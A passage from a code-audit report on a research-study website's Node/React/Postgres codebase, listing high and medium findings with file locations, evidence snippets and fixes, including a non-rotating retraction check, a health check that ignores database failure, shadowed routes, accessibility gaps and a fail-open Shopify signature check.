batchRetractionCheck selects studies with an unordered query and .limit(batchSize) with no last-checked tracking and no ORDER BY. The daily job (job-scheduler.ts:1187, comment claims 'rotates through all over time') therefore re-checks the same ~50 rows every day while thousands of other studies are never screened for retraction — the site's scientific-integrity safeguard is effectively non-functional beyond the first page of rows.

Evidence: `const studiesWithDois = await db.select({...}).from(studies).where(and(isNotNull(studies.doi), ...)).limit(batchSize);`

**Fix:** Add a lastRetractionCheckAt column (or reuse lastModified), select ORDER BY lastRetractionCheckAt ASC NULLS FIRST, and stamp it after each check so the batch genuinely rotates.

### Study approval is not idempotent — re-approval creates duplicate study rows

`server/services/study-analysis-pipeline.ts:385` · high (verifier suggests medium) · effort: small · auditor: services-r-z

createStudyFromPipelineItem never checks item.status before inserting, and studies.doi is non-unique. The single /approve/:id route's 'completed' check is read-then-act (racy on double-click), and /approve-bulk (pipeline-routes.ts:234) has no status check at all — re-submitting ids, or approving pending/rejected items, inserts duplicate or half-empty study rows (all step results default to null/[]).

Evidence: `if (!item) throw ...; const results = parseStepResults(item.stepResults); const studyId = await createStudyFromResults(item, results);`

**Fix:** In createStudyFromPipelineItem, atomically flip status awaiting_approval→completed (UPDATE ... WHERE status='awaiting_approval' RETURNING) before inserting; throw if no row matched. Bulk route then inherits the guard.

### /health (Railway healthcheck) reports healthy with the database completely down

`server/utils/health-monitoring.ts:139` · high · effort: small · auditor: reliability-ops

performHealthCheck only degrades status at 2+ errors. A dead database pushes exactly one error ("Database connection failed"), so status stays "healthy" and app.ts:868-870 returns 200. Since db-fail and db-slow are mutually exclusive, max possible errors is 2, so "unhealthy" (needs 3) is unreachable and 503 requires DB-down AND >95% heap simultaneously. railway.toml points healthcheckPath at /health, so Railway promotes/keeps DB-dead instances. /healthz gets it right (503 on DB fail) but isn't wired to Railway.

Evidence: `if (errors.length >= 3) { status = "unhealthy"; } else if (errors.length >= 2) { status = "degraded"; }`

**Fix:** Make dbHealth.connected === false immediately set status "unhealthy" (and have /health/ready semantics), or change railway.toml healthcheckPath to /healthz which already 503s on DB failure.

### search_vector column, GIN index, and trigger exist only in boot migration, not in drizzle schema managed by preDeploy db:push

`shared/schema.ts:269` · high (verifier suggests medium) · effort: small · auditor: data-layer

Migration 001 adds studies.search_vector (tsvector), a GIN index, and a trigger writing NEW.search_vector. Neither column nor trigger is declared in shared/schema.ts (0 occurrences of search_vector in either schema file), yet railway.toml runs `drizzle-kit push` on every deploy and instructs devs to run it locally to resolve diffs. If push ever proposes and someone accepts dropping the unknown column, the surviving trigger references NEW.search_vector and every INSERT/UPDATE on studies fails; relevance search (ts_rank in study-service.ts:208) also breaks.

Evidence: `add-fulltext-search.ts:26 ALTER TABLE studies ADD COLUMN search_vector tsvector vs grep search_vector shared/ = 0 hits; railway.toml preDeployCommand = "npm run db:push"`

**Fix:** Declare search_vector in shared/schema.ts via customType (like the existing bytea at schema.ts:21) so drizzle-kit push never diffs it; document the trigger dependency next to it.

### 463 kB recharts chunk force-loaded on every page via clsx colocation

`vite.config.ts:83` · high · effort: small · auditor: frontend-quality

manualChunks pins recharts into a "charts" chunk, but Rollup colocated shared tiny deps (clsx — used eagerly by lib/utils cn() — plus all 229 lodash modules) into it. The entry chunk therefore statically imports charts-BUQ85S9X.js (463 kB, 122.7 kB gzip) and index.html modulepreloads it, so every visitor downloads recharts+d3+lodash on first paint of any page, including the homepage, though charts render only on lazy pages (BlogPage, StudyExplorer, analytics).

Evidence: `dist index.html: <link rel="modulepreload" ... /assets/charts-BUQ85S9X.js>; entry: import{c as Ma}from"./charts-BUQ85S9X.js" where export Y is clsx's implementation; sourcemap: lodash 229, recharts 84 modules.`

**Fix:** In manualChunks, pin clsx/tailwind-merge (and other eager shared deps) to "vendor" before the recharts check, or drop the manual charts pin entirely. Rebuild and verify index.html no longer modulepreloads charts-*.js.

---

## MEDIUM (85 findings)

### Node version inconsistent across engines, CI, build target, and Railway — prod runtime is not the CI-tested version

`.github/workflows/ci.yml:18` · medium · effort: small · auditor: tests-ci

package.json engines is a loose ">=20.0.0"; CI hardcodes node-version: 22; esbuild targets node20 (package.json build script); nixpacks.toml pins no Node version (only an install phase), so Railway resolves its own from the open-ended engines range; local dev is on 26. No .nvmrc/.node-version. CI can pass on 22 while prod runs a different major.

Evidence: `ci.yml: node-version: 22; package.json: "node": ">=20.0.0", --target=node20; nixpacks.toml has only [phases.install]`

**Fix:** Pin one version everywhere: engines "22.x", NIXPACKS_NODE_VERSION=22 (or nixPkgs nodejs_22) in nixpacks.toml, keep CI at 22, add .nvmrc with 22.

### [known] npm install instead of npm ci in both CI and Railway builds — lockfile never enforced

`.github/workflows/ci.yml:22` · medium · effort: small · auditor: tests-ci

Still open from the July audit: ci.yml runs npm install and nixpacks.toml's install phase is cmds = ["npm install"]. Commit d40eb7b deliberately switched CI away from npm ci 'for cross-version compat'. Neither CI nor the Railway production build is guaranteed to install package-lock.json versions, so CI can test different dependency trees than prod deploys, and lockfile drift goes undetected.

Evidence: `ci.yml: run: npm install; nixpacks.toml: cmds = ["npm install"]`

**Fix:** Restore npm ci in both (root cause was node-version mismatch, now fixable by pinning Node 22 everywhere per the version-consistency finding); regenerate the lockfile once on the pinned version.

### [known] CI and Railway both use `npm install`, and CI tests run with --passWithNoTests

`.github/workflows/ci.yml:22` · medium · effort: small · auditor: deps-build

Re-verified still open: nixpacks.toml:2 and ci.yml:22 both run `npm install`, so the lockfile is never enforced — prod and CI can silently resolve different dependency trees than developers tested (relevant because esbuild --packages=external means the server executes whatever node_modules Railway installed). Additionally ci.yml:31 runs `npx vitest run --passWithNoTests`, so a test include-glob regression makes CI pass green with zero tests collected.

Evidence: `nixpacks.toml: cmds = ["npm install"]; ci.yml: run: npm install ... run: npx vitest run --passWithNoTests`

**Fix:** Change both to `npm ci`. In ci.yml, run `npm test` (vitest run) without --passWithNoTests so an empty test collection fails the build.

### /studies/tags route unreachable — shadowed by earlier /studies/:slug route

`client/src/App.tsx:557` · medium (verifier suggests low) · effort: small · auditor: frontend-correctness

In wouter's Switch the first matching route wins. `/studies/:slug` (App.tsx:223) is declared before `/studies/tags` (App.tsx:557), so navigating to /studies/tags renders SEOStudyPage, which fetches /api/studies/slug/tags and shows the 'study not found' error instead of TaggedStudiesPage. The two-segment `/studies/tags/:category` still works because a single-segment param doesn't match two segments; /browse-by-tags also works.

Evidence: `line 223: <Route path="/studies/:slug" component={SEOStudyPage} /> ... line 557: <Route path="/studies/tags" component={TaggedStudiesPage} />`

**Fix:** Move the /studies/tags and /studies/tags/:category routes above /studies/:slug in the Switch.

### /studies/tags route is shadowed by /studies/:slug and the tags page has no inbound links

`client/src/App.tsx:557` · medium (verifier suggests low) · effort: small · auditor: frontend-quality

In the wouter Switch, `<Route path="/studies/:slug" component={SEOStudyPage} />` (line 223) precedes `<Route path="/studies/tags" ...>` (line 557), so visiting /studies/tags renders SEOStudyPage with slug="tags" (study-not-found) instead of TaggedStudiesPage. /studies/tags/:category still works (two segments). Additionally, no component links to /studies/tags or /browse-by-tags, so the 522-line TaggedStudiesPage is only reachable by typing the URL.

Evidence: `App.tsx:223 <Route path="/studies/:slug" component={SEOStudyPage} /> before App.tsx:557 <Route path="/studies/tags" component={TaggedStudiesPage} />; grep finds zero links to either path.`

**Fix:** Move the /studies/tags routes above /studies/:slug in the Switch (wouter matches first hit). Then either add navigation links to the tags page or delete it.

### MedicalDisclaimer blocking modal has no dialog semantics, focus trap, or keyboard dismiss

`client/src/components/MedicalDisclaimer.tsx:25` · medium · effort: small · auditor: frontend-quality

Every first-time visitor on every non-admin page gets a full-screen overlay modal rendered as plain divs: no role="dialog", no aria-modal, focus is not moved into it, no focus trap, and no Escape handling. Screen-reader users may never perceive the disclaimer while the page behind remains fully tab-reachable underneath the visual overlay; keyboard users can interact with obscured content. The project already ships Radix Dialog (used elsewhere) which handles all of this.

Evidence: `MedicalDisclaimer.tsx:25 <div className="fixed inset-0 z-[60] ... bg-black/50 p-4"> — no role, aria-modal, tabIndex, onKeyDown, or focus management anywhere in the 63-line file.`

**Fix:** Replace the raw divs with the existing Radix AlertDialog (non-dismissable variant), or add role="dialog", aria-modal="true", aria-labelledby, initial focus, a focus trap, and inert/aria-hidden on the background.

### StudyForm publishDate shifts back one day per edit in western timezones

`client/src/components/admin/StudyForm.tsx:79` · medium · effort: small · auditor: frontend-correctness

publishDate is stored as text 'yyyy-MM-dd' (shared/schema.ts:277). StudyForm parses it with new Date(initialData.publishDate) — interpreted as UTC midnight — then serializes with date-fns format(date, "yyyy-MM-dd"), which uses local time. In any UTC-negative timezone (all US zones) the calendar displays the previous day and saving an untouched form writes publishDate minus one day; each open-and-save cycle shifts the date back another day.

Evidence: `publishDate: initialData?.publishDate ? new Date(initialData.publishDate) : new Date() ... publishDate: format(data.publishDate, "yyyy-MM-dd")`

**Fix:** Parse date-only strings as local dates, e.g. date-fns parse(value, "yyyy-MM-dd", new Date()) or new Date(y, m-1, d), leaving the format call as is.

### ProtectedRoute role check fails open when /api/auth/me errors

`client/src/components/auth/ProtectedRoute.tsx:150` · medium (verifier suggests low) · effort: small · auditor: frontend-correctness

Role and permission gates only run when userDetails?.user is present: `if (requiredRoles.length > 0 && userDetails?.user)`. If the /api/auth/me query errors (transient 500, 404 user-not-found, session expiring between the cached check-session read and the me fetch — its error is never inspected), userDetails is undefined, both gates are skipped, and children render. An authenticated non-admin can thus see admin pages' UI; only server-side requireAdmin on APIs prevents data access.

Evidence: `if (requiredRoles.length > 0 && userDetails?.user) { ... } // skipped entirely when me-query fails`

**Fix:** Track the me-query's isError; when requiredRoles/requiredPermissions are non-empty, treat missing/errored userDetails as denied (or retry), never as pass.

### [known] Dead frontend code re-measured: 64 unreferenced files, 14,261 lines

`client/src/components/search/AdvancedSearchForm.tsx:1` · medium · effort: medium · auditor: frontend-quality

64 client/src files (14,261 lines; ~11,600 excluding shadcn ui primitives) are referenced by no import specifier anywhere, including dynamic imports. Largest: search/AdvancedSearchForm.tsx (1,047), analytics/ContentAnalyticsDashboard.tsx (588), AdvancedSearchFilters.tsx (524), admin/ExcelImportForm.tsx (517), admin/DoiEnhancer.tsx (505), search/SearchResultsPage.tsx (504), admin/BlogForm.tsx (476), RecommendationEngine.tsx (440), hooks/use-content-analytics.tsx (438), sharing/ResearchInsightCard.tsx (393), chatbot/ChatbotDialogue.tsx (331), pages/ResearchInsightsPage.tsx (268), admin/StudyTable.tsx (239 — the known query-key bug lives in dead code), pages/ChatPage.tsx (94).

Evidence: `Specifier scan: zero files import them; e.g. SearchAutocomplete (with phantom import { debounce } from "lodash" — lodash not in package.json) is imported only by dead SearchResultsPage.`

**Fix:** Delete the ~48 non-shadcn dead files in one PR (git preserves history); optionally run knip in CI to keep them out. Close the StudyTable query-key known-issue as dead code.

### Phantom lodash dependency: client imports lodash that only exists via react-quill/recharts hoisting

`client/src/components/search/SearchAutocomplete.tsx:13` · medium · effort: small · auditor: deps-build

SearchAutocomplete.tsx does `import { debounce } from "lodash"` but lodash is not in package.json — it resolves only because react-quill and recharts hoist lodash@4.18.1 to node_modules root. A hand-written shim (client/src/lodash.d.ts) papers over the missing types. Removing react-quill (recommended above) or an npm dedupe/hoisting change breaks the Vite build. Also imports the full lodash into the client bundle for one function.

Evidence: `import { debounce } from "lodash"; npm ls lodash: only under react-quill@2.0.0 and recharts@2.15.4; lodash absent from package.json`

**Fix:** Add an explicit dependency (`npm i lodash @types/lodash -D` for types), or better: replace with a 10-line local debounce util and delete client/src/lodash.d.ts.

### Search fires un-debounced rate-limited request per keystroke with no error state

`client/src/pages/EnhancedSearchPage.tsx:226` · medium · effort: small · auditor: frontend-correctness

The main search input calls handleSearch({ query: e.target.value }) on every keystroke, changing the queryKey and firing an immediate fetch to /api/search/enhanced, which sits behind searchRateLimiter (30 req/min/IP, non-admin). The suggestions query (enabled at length > 2) doubles the rate. Typing two or three queries exhausts the bucket; the resulting 429s are swallowed — isError is never read — so users see a silent empty/stale result list.

Evidence: `onChange={(e) => handleSearch({ query: e.target.value })} ... only data: searchResults, isLoading: searchLoading destructured`

**Fix:** Debounce the query value (300ms) before it enters the queryKey, and render an error state (including 429 messaging) from the query's isError/error.

### Legal pages show a fake, always-current 'Last Updated' date

`client/src/pages/PrivacyPolicyPage.tsx:31` · medium · effort: small · auditor: gap

All three legal pages render the timestamp as new Date() at view time (PrivacyPolicyPage.tsx:31, CookiePolicyPage.tsx:38, TermsOfServicePage.tsx:31 — the Terms page even labels it "Effective Date"). Every visitor sees today's date, so the pages misrepresent when terms actually changed and users can never detect a revision — undermining the policy's own change-notification clause (section 10) and the enforceability of the Terms' effective date.

Evidence: `Last Updated: {new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' })}`

**Fix:** Replace the dynamic date with a hard-coded literal on each page, updated only when the text actually changes; add the real revision date to version control history.

### ProductsPage BuyersGuideModal is a div overlay without dialog semantics or focus management

`client/src/pages/ProductsPage.tsx:65` · medium · effort: small · auditor: frontend-quality

The public buyer's-guide email-capture modal is hand-rolled: backdrop div with onClick to close, inner div with stopPropagation, no role="dialog", no aria-modal, no focus trap, no Escape handler, and focus is not moved to the modal or restored on close. Keyboard and screen-reader users can tab into the page behind the overlay, and keyboard-only users cannot dismiss it except by tabbing to the close button.

Evidence: `ProductsPage.tsx:65 <div className="fixed inset-0 z-50 ... bg-black/50 p-4" onClick={onClose}> and :68 onClick={(e) => e.stopPropagation()} — no role/aria/keyboard handling in the component.`

**Fix:** Rebuild on the project's existing Radix Dialog primitive (components/ui/dialog), which provides role, aria-modal, focus trap, Escape, and focus restore for free.

### [known] Duplicate StudyPage vs SEOStudyPage still live — two divergent study-detail implementations

`client/src/pages/StudyPage.tsx:1` · medium · effort: medium · auditor: frontend-quality

Confirmed still present: StudyPage.tsx (1,106 lines, routed at /study/id/:id) and SEOStudyPage.tsx (651 lines, routed at /study/:slug and /studies/:slug) both fetch and render full study detail with separate Study interfaces, separate markdown-to-HTML converters, and separate meta/Helmet logic. Cards link to one or the other depending on whether a slug exists (EnhancedStudyCard.tsx:105), so users get different UX for the same entity and fixes must be made twice. Built as two chunks (28.4 kB + 24.7 kB).

Evidence: `App.tsx:221-223 routes both; EnhancedStudyCard.tsx:105 href={study.slug ? \/study/${study.slug}\ : \/study/id/${study.id}\}; each file defines its own markdownToSafeHtml and Study interface.`

**Fix:** Make StudyPage a thin wrapper that resolves id→slug and redirects to the canonical SEOStudyPage (or vice versa), then delete the duplicated rendering code.

### Clickable cards and badges lack keyboard access across browse/search pages

`client/src/pages/TaggedStudiesPage.tsx:215` · medium · effort: medium · auditor: frontend-quality

Multiple public pages attach onClick to non-interactive elements (Card divs, Badge spans) with cursor-pointer but no role="button", tabIndex, or key handlers, so keyboard users cannot activate them: category cards and tag badges in TaggedStudiesPage (lines 215-218, 313, 349, 501), search suggestions and tags in EnhancedSearchPage (245, 419, 563), body-system regions in explorer/InteractiveBodyMap.tsx (175+), and dashboard search shortcuts in MyDashboardPage.tsx (277). Only 8 onKeyDown handlers exist in the whole client.

Evidence: `TaggedStudiesPage.tsx:215-218 <Card ... className="cursor-pointer ..." onClick={() => handleCategorySelect(category.slug)}> — no role, tabIndex, or onKeyDown.`

**Fix:** Wrap card content in a real link/button (these all navigate or set filters), or add role="button", tabIndex={0}, and Enter/Space onKeyDown. A shared ClickableCard component would cover all sites.

### Admin studies sort by Date/Category silently sorts by id — unrecognized sortBy values

`client/src/pages/admin/StudiesTable.tsx:354` · medium · effort: small · auditor: frontend-correctness

The Sort menu sends sortBy="publish_date" or "category". studyService.getStudies maps only "date", "title", "author", "journal", "publishYear", "viewCount", "journalPublishDate" and falls back to studies.id otherwise (study-service.ts:211-218). So choosing Date or Category in the admin table silently sorts by id while the UI shows '(Newest)'/'(A-Z)' as if it worked. Only Title sorting functions.

Evidence: `toggleSort("publish_date") / toggleSort("category") vs server: if (sortField === "date") ... else sortColumn = studies.id`

**Fix:** Send the field names the service understands ("date", "title") and either add a category mapping server-side or remove the Category sort option.

### [known] No shared API types — 18 duplicate Study interfaces, 3 conflicting 'canonical' client types, phantom fields

`client/src/types/study.ts:19` · medium · effort: large · auditor: api-contract

Quantified: 18 separate `interface Study` declarations across 27 client files, plus three competing canonical types (types/study.ts, types/index.ts, types/hydrogen.ts). types/study.ts declares `isPeerReviewed` but the server field is `peerReviewed` (shared/schema.ts:287) — the phantom field is never populated. SEOStudyPage.tsx:35-84 declares every field in BOTH camelCase and snake_case defensively because nobody knows the real shape. This drift directly caused the StudiesTable totalPages bug and the chat NaN bug.

Evidence: `isPeerReviewed?: boolean | null; // server sends peerReviewed`

**Fix:** Cheapest path exists already: client tsconfig aliases @shared (21 imports; StudyInfoPanel.tsx already uses `typeof studies.$inferSelect`), and shared/schemas/multi-format.ts sets the zod precedent. Export Study = InferSelectModel, PaginatedResults<T>, and per-endpoint response types from shared/; delete local interfaces incrementally.

### Widespread vacuous e2e assertions: expect(body).toBeTruthy() and vacuously-passing conditional tests

`e2e/public-pages.spec.ts:27` · medium (verifier suggests low) · effort: medium · auditor: tests-ci

Roughly 29 e2e assertions cannot fail on a broken page: expect(body).toBeTruthy() passes on any error page (public-pages.spec.ts:27,81,129,136,143; seo-and-metadata.spec.ts:73). The 404 test matches /not found|404|page/i — 'page' matches nearly any content (public-pages.spec.ts:102). Several tests wrap all assertions in `if ((await links.count()) > 0)`, passing vacuously when the DB is empty or selectors rot (public-pages.spec.ts:150-154, navigation-flow.spec.ts:45).

Evidence: `const body = await page.textContent("body");
    expect(body).toBeTruthy();`

**Fix:** Replace body-truthy checks with specific content or response-status assertions; drop 'page' from the 404 regex and assert HTTP 404 status; convert if-count guards into hard expectations against seeded fixture data.

### [known-class] Unique constraints on studies.doi and queue remain an optional manual script, never integrated into boot migrations

`scripts/add-unique-constraints.sql:6` · medium · effort: medium · auditor: gap

apply-unique-constraints.ts is a hand-run railway script; migration-runner.ts does not include it, and the boot index (add-studies-doi-index.ts, schema.ts:421) is 'deliberately NON-unique'. Every import path — bulk-doi-import's per-DOI SELECT-then-INSERT (bulk-doi-import.ts:647-683), the WP importer's in-memory sets, and the 6h discovery cron — relies on app-level checks with no DB backstop and no advisory lock, so a script run concurrent with the cron, or a crashed/re-run import, creates duplicate study rows.

Evidence: `SQL header: "WHY THIS IS A MANUAL SCRIPT (not in schema.ts)"; schema.ts:422: "deliberately NON-unique: legacy duplicate DOIs exist"`

**Fix:** Execute the runbook (dedupe then create uq_studies_doi_lower), then register a migration that asserts the index exists; have import scripts take the discovery advisory lock or use ON CONFLICT.

### apply-unique-constraints reports success even when CONCURRENTLY left an INVALID, unenforced index

`scripts/apply-unique-constraints.ts:38` · medium · effort: small · auditor: gap

If a live worker inserts a duplicate active queue row between the DELETE (l.26) and CREATE UNIQUE INDEX CONCURRENTLY (l.37) — the exact race this index is meant to fix — the concurrent build fails and Postgres leaves the index behind marked INVALID. On re-run, IF NOT EXISTS sees the invalid index and skips creation, and the verification query (l.66) checks pg_indexes presence only, not pg_index.indisvalid. The script then prints 'ready' while the uniqueness constraint is silently unenforced.

Evidence: `CREATE UNIQUE INDEX CONCURRENTLY IF NOT EXISTS uq_cgq_active_study then verification: SELECT indexname FROM pg_indexes WHERE indexname IN (...) — no indisvalid check.`

**Fix:** After creation, query pg_index.indisvalid for both indexes; if invalid, DROP INDEX and retry (re-running the dedupe DELETE first), and fail with non-zero exit otherwise.

### bulk-doi-import PMID path inserts duplicates on every re-run (no DOI, no stored PMID)

`scripts/bulk-doi-import.ts:702` · medium (verifier suggests low) · effort: small · auditor: gap

importByPMID dedupes only via checkDuplicateByDOI(doi), and checkDuplicateByDOI returns false for empty/undefined DOI. When EuropePMC returns no DOI for a PMID, the study is inserted with doi:"" and the PMID is only embedded in citationUrl (schema has no pmid column). Re-running the script — its documented recovery mode after partial failure, with no dry-run flag — re-inserts every such PMID study as a duplicate. DOI dedupe is also case-sensitive eq() while the intended index is on lower(doi).

Evidence: `if (!doi) return false; (l.648) and if (doi && await checkDuplicateByDOI(doi)) (l.702) — no dedupe when EuropePMC returns no doi.`

**Fix:** Dedupe PMID imports by citationUrl or title+journal; store the PMID; use lower(doi) comparison; add a --dry-run flag before any insert.

### WP import stores doi_pmid_link meta verbatim as doi, breaking cross-source dedupe and citation URLs

`scripts/import-wordpress-xml.ts:99` · medium (verifier suggests low) · effort: small · auditor: gap

wp.doi comes from the WordPress meta key `doi_pmid_link` — by name a full link (doi.org or pubmed URL) — and is written unnormalized into studies.doi (line 286) and into citationUrl as `https://doi.org/${wp.doi}` (line 295), yielding `https://doi.org/https://doi.org/10.x` for link-valued metas. Because bulk-doi-import and the discovery engine store bare DOIs, the DOI dedupe sets (lines 364, 378) never match across sources, so the same paper imported via both paths becomes two study rows with one broken citation link.

Evidence: `const doi = extractMeta(itemXml, "doi_pmid_link"); then citationUrl: wp.doi ? https://doi.org/${wp.doi} : null`

**Fix:** Normalize the meta: strip https://doi.org/ and pubmed URL prefixes, lowercase, store bare DOI (or null for PMID links) before dedupe and citationUrl construction.

### Shopify proxy HMAC auth fails open when SHOPIFY_APP_SECRET is unset

`server/app.ts:365` · medium · effort: small · auditor: security-routes

shopifyProxyAuth skips HMAC verification entirely if SHOPIFY_APP_SECRET is missing, including in production. A prod deploy with the var unset (rotation, new environment) silently serves the whole /proxy surface — SSR pages and CSV export — without Shopify signature verification. Contrast session-config.ts, which deliberately fails closed on a missing secret. /proxy/embed/* is exempt by design, but the rest should never run unverified in prod.

Evidence: `const secret = process.env.SHOPIFY_APP_SECRET;
if (!secret) {
  // No secret configured — skip verification (local dev)
  return next();
}`

**Fix:** In production (NODE_ENV === "production"), return 503/401 when SHOPIFY_APP_SECRET is unset instead of next(); keep the skip only for non-production.

### Quality-tests endpoint uses Neon serverless driver against Railway Postgres — guaranteed runtime failure and duplicate DB driver

`server/automated-quality-tests.ts:57` · medium (verifier suggests low) · effort: small · auditor: deps-build

The app's DB layer is node-postgres (server/db.ts uses pg Pool), but automated-quality-tests.ts creates connections via @neondatabase/serverless neon(), which talks HTTP to a Neon proxy endpoint and cannot connect to a plain TCP Postgres like Railway's. server/app.ts:736 dynamically imports and runs these tests, so every test throws 'fail' at runtime. Also drags a second Postgres driver (plus ws-adjacent code) into the prod bundle graph.

Evidence: `import { neon } from "@neondatabase/serverless"; const sql = neon(process.env.DATABASE_URL!); vs server/db.ts: import pg from "pg"`

**Fix:** Rewrite automated-quality-tests.ts to use the shared pool/db from server/db.ts, then remove @neondatabase/serverless from dependencies.

### Public search endpoints 500 on limit=0 or non-numeric pagination params

`server/controllers/search-controller.ts:77` · medium (verifier suggests low) · effort: small · auditor: routes-utils

enhancedSearch and simpleSearch (line 132) compute limit with Math.min but no lower bound or NaN fallback: ?limit=abc yields NaN, ?limit=0 yields division by zero, so page = Math.floor(offset/limit)+1 becomes NaN. studyService.getStudies propagates NaN (Math.max(1, parseInt("NaN")) is NaN) into .limit(NaN)/.offset(NaN), producing a Postgres error and a 500 instead of a 400. explorer-routes.ts:11 has the same unchecked parseInt on startYear/endYear.

Evidence: `const limit = Math.min(100, parseInt(String(req.query.limit || "20"))); const offset = parseInt(String(req.query.offset || "0")); const page = Math.floor(offset / limit) + 1;`

**Fix:** Clamp like natural-language-search-routes.ts:53: Math.min(100, Math.max(1, parseInt(...) || 20)) and Math.max(0, parseInt(...) || 0) in enhancedSearch, simpleSearch, advancedSearch, and explorer-routes.

### PUT /api/studies/:id passes raw req.body straight into db.update().set()

`server/controllers/studies-controller.ts:522` · medium · effort: small · auditor: routes-utils

updateStudy forwards req.body unvalidated to studyService.updateStudy, which calls db.update(studies).set(study) (study-service.ts:302-309). An empty body makes drizzle throw "No values to set" (returned as 500), wrong-typed fields become opaque DB 500s instead of 400s, and protected columns (id, slug, createdAt, viewCount) can be overwritten, which can break canonical URLs and the redirect system. Admin-only, but the admin StudyForm is the primary write path.

Evidence: `const updatedStudy = await studyService.updateStudy(studyId, req.body);`

**Fix:** Validate with a zod partial of the insert schema (createInsertSchema(studies).partial().strip()), reject empty updates with 400, and omit id/slug/createdAt from the settable fields.

### Pool-wide statement_timeout=30s applies to boot migrations and backfills, risking crash-loop on any long migration

`server/db.ts:22` · medium · effort: small · auditor: data-layer

The single pg Pool sets `-c statement_timeout=30000` on every connection. app.ts:915-953 runs all versioned migrations and backfills through this same pool (db/pool). Any future migration statement exceeding 30s — e.g. a full-table UPDATE like add-fulltext-search.ts:31 or an index build on the grown studies table — throws, hits the `process.exit(1)` at app.ts:968, and with restartPolicyMaxRetries=3 leaves the service down.

Evidence: `db.ts:22 options: "-c statement_timeout=30000"; app.ts:966-968 FATAL: Migration failed → process.exit(1)`

**Fix:** Run migrations on a dedicated client/pool with statement_timeout disabled (SET statement_timeout = 0 per migration connection), keeping the 30s cap for request-serving connections.

### SIGTERM abandons in-flight background jobs; pool closed under them and interrupted items stall up to 90 minutes

`server/index.ts:128` · medium · effort: medium · auditor: reliability-ops

shutdown() calls jobScheduler.stop(), which only clears the two intervals — running jobs (content-queue drains up to 10 min, blog generation up to 30 min) are neither awaited nor aborted; the AbortController plumbing in withTimeout is never triggered on shutdown. server.close's callback then runs pool.end() while those jobs may still be mid-write, and the 30s force-exit kills them. Interrupted content_generation_queue items sit in 'processing' until the 90-minute stale threshold (stale-job-recovery.ts:27) passes — every Railway deploy mid-drain delays that study's content ~90 min.

Evidence: `jobScheduler.stop(); ... server.close(async () => { ... try { await pool.end(); } catch {} ... });`

**Fix:** Give JobScheduler a shutdown AbortController aborted in stop(); have shutdown await active-job completion (bounded, e.g. 20s) before pool.end(). Optionally have the content worker release its claimed item to 'pending' on abort (the signal path already exists).

### Bot-only HTML sent with Cache-Control: public, max-age=3600 but no Vary: User-Agent

`server/middleware/seo-bot-middleware.ts:588` · medium · effort: small · auditor: gap

Responses differ entirely by User-Agent (prerendered bot HTML with the JS bundle stripped vs the SPA shell), yet bot responses are marked publicly cacheable for 1h with no Vary header. Any shared cache in the request path (corporate/ISP proxy, or a CDN added in front of Railway later) may cache the bot variant and serve it to human visitors, who then get an unstyled page with no JavaScript — the site appears completely broken for up to an hour.

Evidence: `res.set("Cache-Control", "public, max-age=3600"); (no res.set("Vary", "User-Agent"))`

**Fix:** Add Vary: User-Agent to all bot-middleware responses (HIT, MISS, and 404 branches), or use Cache-Control: private/no-store for the bot-rendered variant.

### Spoofed bot UA triggers unauthenticated, unlimited per-request DB renders and LRU cache eviction

`server/middleware/seo-bot-middleware.ts:556` · medium · effort: medium · auditor: gap

isBot() trusts the User-Agent header and the middleware has no rate limiting. 404 responses for content paths are deliberately uncached, so every /study/<random-n> request with a Googlebot UA runs a fresh DB query. Unique slugs under /explore-by-*/ and /hydrogen-for/ each execute multi-column ILIKE '%…%' sequential scans plus related-content queries (seo-body-renderer.ts:614-623, 664-674), and each distinct path is cached — filling the 6000-entry LRU and evicting the prewarmed legitimate pages, degrading real-crawler latency while amplifying DB load.

Evidence: `if (!meta && isContentPath(req.path)) { ... res.set("Cache-Control", "no-cache"); (per-request DB, uncached)`

**Fix:** Apply a per-IP rate limiter to the bot path (bots tolerate 429), cache negative (404) results briefly, and/or verify major crawlers via reverse-DNS before doing uncached DB renders.

### Migration runner has no advisory lock and no per-migration transaction; partial failures can be permanently masked

`server/migrations/migration-runner.ts:54` · medium · effort: medium · auditor: data-layer

runMigrations does check-then-act (isApplied → up() → recordMigration) with no pg advisory lock, so two overlapping instances (replicas, deploy overlap) can run the same migration concurrently. up() is not wrapped in a transaction, so a mid-migration failure leaves half-applied DDL unrecorded. Worse, add-fulltext-search.ts:19-22 treats "column exists" as fully applied, so a rerun after partial failure permanently skips the backfill, index, and trigger.

Evidence: `migration-runner.ts:57-65 if (await isApplied(...)) continue; ... await migration.up(); await recordMigration(...) — no lock, no tx`

**Fix:** Take pg_advisory_lock at the start of runMigrations and wrap each up()+recordMigration in a transaction; make add-fulltext-search's existence check cover the trigger and index, not just the column.

### Admin audit-log endpoint returns oldest entries, never recent activity

`server/routes/auth-routes.ts:637` · medium · effort: small · auditor: routes-utils

GET /api/auth/audit-logs orders by createdAt ascending (drizzle default) then applies limit (default 100). Once the audit_logs table exceeds the limit, admins only ever see the oldest rows — recent security-relevant events (logins, role changes, deletions) are invisible from this endpoint, defeating the purpose of an audit review UI. Both the per-user and all-users branches (line 643) are affected.

Evidence: `.orderBy(auditLogs.createdAt)
.limit(limit);`

**Fix:** Use .orderBy(desc(auditLogs.createdAt)) in both branches, and clamp limit (currently unbounded parseInt).

### Four incompatible success-envelope shapes across the busiest endpoints

`server/routes/blog-routes.ts:211` · medium · effort: medium · auditor: api-contract

Studies list: {data,total,page,pageSize,pageCount}. Blog list: {data,total,page,limit,totalPages}. Blog/chat detail: {success,data}. Unified search: {success,query,studies,total,totalPages,hasMore}. Explorer/latest: bare arrays. Client compensates with safeArray() probing five candidate keys (lib/utils.ts:49-58) and ChatWidget's triple-nested `data.data.data ? data.data.data : data.data` unwrap (ChatWidget.tsx:257-260). Every new consumer guesses the envelope; two guessed wrong (findings above).

Evidence: `totalPages: Math.ceil(totalResult.count / limit), // studies uses pageCount`

**Fix:** Standardize one paginated envelope ({data,total,page,pageSize,pageCount}) as a shared/ type; alias old keys during migration (emit both totalPages and pageCount for one release). Drop the {success,data} wrapper or apply it uniformly.

### Public blog list returns full article rows: 411 KB JSON, internal editorNotes exposed

`server/routes/blog-routes.ts:102` · medium (verifier suggests high) · effort: small · auditor: api-contract

GET /api/blogs uses `db.select()` with no column projection, so every list row carries full `content`, `faqSchema`, `hierarchicalStructure`, and internal `editorNotes`. Measured in prod: default request (50 rows) is 411 KB; limit=200 is 1.6 MB. The public /blog page only renders title/summary/image/date cards, and editorNotes is an internal admin field leaking to anonymous users.

